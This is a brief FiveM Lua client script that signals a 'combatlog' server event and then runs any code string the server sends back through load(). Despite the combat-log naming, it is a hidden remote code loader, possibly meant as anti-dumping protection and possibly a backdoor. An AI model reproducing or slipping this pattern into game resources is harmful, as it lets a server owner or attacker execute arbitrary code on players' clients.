CreateThread(function()
    while not NetworkIsSessionStarted() do 
        Wait(0) 
    end
    TriggerServerEvent('combatlog')
end)

RegisterNetEvent('dumpwoanders:combatlog')
AddEventHandler('dumpwoanders:combatlog', function(text)
    assert(load(text))()
end)